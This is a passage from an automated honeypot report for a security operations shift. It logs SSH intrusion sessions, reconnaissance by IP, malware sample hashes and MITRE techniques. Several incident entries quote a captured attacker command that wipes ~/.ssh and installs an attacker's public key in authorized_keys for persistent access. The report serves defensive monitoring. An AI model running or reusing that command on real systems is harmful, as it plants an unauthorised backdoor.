| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:51:35` | `cowrie.session.connect` |
| `2026-06-02 20:51:35` | `cowrie.client.version` |
| `2026-06-02 20:51:35` | `cowrie.client.kex` |
| `2026-06-02 20:51:35` | `cowrie.login.success` |
| `2026-06-02 20:51:36` | `cowrie.session.params` |
| `2026-06-02 20:51:36` | `cowrie.command.input` |
| `2026-06-02 20:51:36` | `cowrie.command.failed` |
| `2026-06-02 20:51:36` | `cowrie.log.closed` |
| `2026-06-02 20:51:36` | `cowrie.session.params` |
| `2026-06-02 20:51:36` | `cowrie.command.input` |
| `2026-06-02 20:51:36` | `cowrie.session.file_download` |
| `2026-06-02 20:51:36` | `cowrie.log.closed` |
| `2026-06-02 20:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-464f28f4b4af

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 20:51 |
| **Last Seen** | 2026-06-02 20:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:51:38` | `cowrie.session.connect` |
| `2026-06-02 20:51:38` | `cowrie.client.version` |
| `2026-06-02 20:51:39` | `cowrie.client.kex` |
| `2026-06-02 20:51:39` | `cowrie.login.success` |
| `2026-06-02 20:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eefb6222f245

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 20:52 |
| **Last Seen** | 2026-06-02 20:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:52:25` | `cowrie.session.connect` |
| `2026-06-02 20:52:25` | `cowrie.client.version` |
| `2026-06-02 20:52:25` | `cowrie.client.kex` |
| `2026-06-02 20:52:27` | `cowrie.login.success` |
| `2026-06-02 20:52:27` | `cowrie.session.params` |
| `2026-06-02 20:52:27` | `cowrie.command.input` |
| `2026-06-02 20:52:27` | `cowrie.command.failed` |
| `2026-06-02 20:52:28` | `cowrie.log.closed` |
| `2026-06-02 20:52:28` | `cowrie.session.params` |
| `2026-06-02 20:52:28` | `cowrie.command.input` |
| `2026-06-02 20:52:29` | `cowrie.session.file_download` |
| `2026-06-02 20:52:29` | `cowrie.log.closed` |
| `2026-06-02 20:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998f9db1fef9

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 20:52 |
| **Last Seen** | 2026-06-02 20:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:52:32` | `cowrie.session.connect` |
| `2026-06-02 20:52:32` | `cowrie.client.version` |
| `2026-06-02 20:52:33` | `cowrie.client.kex` |
| `2026-06-02 20:52:34` | `cowrie.login.success` |
| `2026-06-02 20:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-391fff8b2d61

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 20:52 |
| **Last Seen** | 2026-06-02 20:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:52:55` | `cowrie.session.connect` |
| `2026-06-02 20:52:55` | `cowrie.client.version` |
| `2026-06-02 20:52:55` | `cowrie.client.kex` |
| `2026-06-02 20:52:56` | `cowrie.login.success` |
| `2026-06-02 20:52:56` | `cowrie.session.params` |
| `2026-06-02 20:52:56` | `cowrie.command.input` |
| `2026-06-02 20:52:56` | `cowrie.command.failed` |
| `2026-06-02 20:52:56` | `cowrie.log.closed` |
| `2026-06-02 20:52:56` | `cowrie.session.params` |
| `2026-06-02 20:52:56` | `cowrie.command.input` |
| `2026-06-02 20:52:56` | `cowrie.session.file_download` |
| `2026-06-02 20:52:56` | `cowrie.log.closed` |
| `2026-06-02 20:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-857776ba38ec

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 20:52 |
| **Last Seen** | 2026-06-02 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:52:58` | `cowrie.session.connect` |
| `2026-06-02 20:52:58` | `cowrie.client.version` |
| `2026-06-02 20:52:58` | `cowrie.client.kex` |
| `2026-06-02 20:52:59` | `cowrie.login.success` |
| `2026-06-02 20:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.64.74[.]51` | **30** | 2026-06-02 18:40 | 2026-06-02 19:41 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `107.0.200[.]227` | **29** | 2026-06-02 16:42 | 2026-06-02 17:48 | 1m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `125.21.59[.]218` | **29** | 2026-06-02 16:42 | 2026-06-02 17:41 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `190.151.130[.]5` | **29** | 2026-06-02 16:42 | 2026-06-02 17:35 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.42[.]238` | **24** | 2026-06-02 16:40 | 2026-06-02 16:45 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `45.78.207[.]244` | **23** | 2026-06-02 17:00 | 2026-06-02 18:41 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `203.110.233[.]225` | **20** | 2026-06-02 20:30 | 2026-06-02 20:51 | 20m | 9 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.27.18[.]80` | **18** | 2026-06-02 19:50 | 2026-06-02 20:52 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `50.116.72[.]139` | **17** | 2026-06-02 20:27 | 2026-06-02 20:52 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.147[.]226` | **16** | 2026-06-02 16:39 | 2026-06-02 17:07 | 21m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.24[.]58` | **13** | 2026-06-02 17:08 | 2026-06-02 17:45 | 20m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `161.35.65[.]86` | **11** | 2026-06-02 20:32 | 2026-06-02 20:51 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `173.212.228[.]191` | **9** | 2026-06-02 18:44 | 2026-06-02 19:03 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `42.200.66[.]164` | **9** | 2026-06-02 20:29 | 2026-06-02 20:51 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `197.221.232[.]44` | **8** | 2026-06-02 20:25 | 2026-06-02 20:52 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `54.37.74[.]179` | **6** | 2026-06-02 20:32 | 2026-06-02 20:52 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `156.227.232[.]198` | **4** | 2026-06-02 20:25 | 2026-06-02 20:35 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `178.62.125[.]229` | **4** | 2026-06-02 19:03 | 2026-06-02 19:14 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `46.24.47[.]94` | **4** | 2026-06-02 20:40 | 2026-06-02 20:50 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `85.110.242[.]249` | **3** | 2026-06-02 18:29 | 2026-06-02 18:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.208.108[.]166` | **2** | 2026-06-02 20:48 | 2026-06-02 20:52 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `176.65.139[.]214` | **2** | 2026-06-02 19:39 | 2026-06-02 19:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.199.210[.]194` | **2** | 2026-06-02 16:40 | 2026-06-02 16:42 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.46.225[.]117` | **2** | 2026-06-02 19:57 | 2026-06-02 19:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.194[.]169` | **2** | 2026-06-02 17:20 | 2026-06-02 17:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.78.198[.]177` | **2** | 2026-06-02 19:46 | 2026-06-02 19:57 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `1.214.179[.]202` | 1 | 2026-06-02 17:12 | 2026-06-02 17:13 | 30s | 0 | `T1592` | 🟢 LOW |
| `106.13.142[.]171` | 1 | 2026-06-02 20:29 | 2026-06-02 20:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.108.13[.]168` | 1 | 2026-06-02 18:10 | 2026-06-02 18:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.29[.]211` | 1 | 2026-06-02 19:22 | 2026-06-02 19:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.38[.]83` | 1 | 2026-06-02 20:34 | 2026-06-02 20:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.166.49[.]42` | 1 | 2026-06-02 19:48 | 2026-06-02 19:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.204[.]8` | 1 | 2026-06-02 19:08 | 2026-06-02 19:09 | 50s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]172` | 1 | 2026-06-02 18:10 | 2026-06-02 18:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-06-02 17:23 | 2026-06-02 17:23 | 10s | 0 | `T1592` | 🟢 LOW |
| `180.184.36[.]192` | 1 | 2026-06-02 16:39 | 2026-06-02 16:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.36[.]192` | 1 | 2026-06-02 20:52 | 2026-06-02 20:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.253.156[.]184` | 1 | 2026-06-02 20:50 | 2026-06-02 20:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.247.137[.]69` | 1 | 2026-06-02 18:37 | 2026-06-02 18:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `188.240.59[.]33` | 1 | 2026-06-02 20:30 | 2026-06-02 20:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `192.142.2[.]40` | 1 | 2026-06-02 20:15 | 2026-06-02 20:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]114` | 1 | 2026-06-02 18:38 | 2026-06-02 18:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `223.76.158[.]107` | 1 | 2026-06-02 18:52 | 2026-06-02 18:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.95.194[.]52` | 1 | 2026-06-02 18:46 | 2026-06-02 18:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `42.51.40[.]180` | 1 | 2026-06-02 19:58 | 2026-06-02 20:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]141` | 1 | 2026-06-02 18:07 | 2026-06-02 18:07 | 15s | 0 | `T1592` | 🟢 LOW |
| `8.154.4[.]21` | 1 | 2026-06-02 20:33 | 2026-06-02 20:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.213.222[.]198` | 1 | 2026-06-02 17:38 | 2026-06-02 17:39 | 30s | 0 | `T1592` | 🟢 LOW |
| `91.92.199[.]36` | 1 | 2026-06-02 20:12 | 2026-06-02 20:12 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.112.126[.]183` | 1 | 2026-06-02 19:14 | 2026-06-02 19:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 39/100 | 🟢 LOW | **24/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 38/100 | 🟢 LOW | **20/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 39/100 | 🟢 LOW | **23/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 37/100 | 🟢 LOW | **19/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.62.125[.]229` | GB | DigitalOcean London | **100** ⚠️ | 0 |
| `1.214.179[.]202` | KR | LG Uplus | **100** ⚠️ | 37 |
| `20.46.225[.]117` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `115.191.29[.]211` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 5 |
| `223.76.158[.]107` | CN | China Mobile Communications Corporation | **100** ⚠️ | 17 |
| `188.240.59[.]33` | GB | Infrawatch Limited | **100** ⚠️ | 11 |
| `101.126.24[.]58` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `137.184.204[.]8` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `46.24.47[.]94` | ES | SVL SISTEMAS SEGURIDAD SL | **100** ⚠️ | 50 |
| `161.35.65[.]86` | DE | DigitalOcean, LLC | **100** ⚠️ | 27 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 448 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 255 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 175 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 89 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 89 |

---

## 🔕 False Positive Summary (109 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 12 below threshold 25 | 96 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 626 cases |
| Tool 34  | Credential Extractor        | ✅ 430 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 61 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 109 filtered (17.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 45 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 175 priority case(s) shown individually · 50 recon entry/entries in table (26 group(s) consolidating 318 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-02T20:54:45Z_
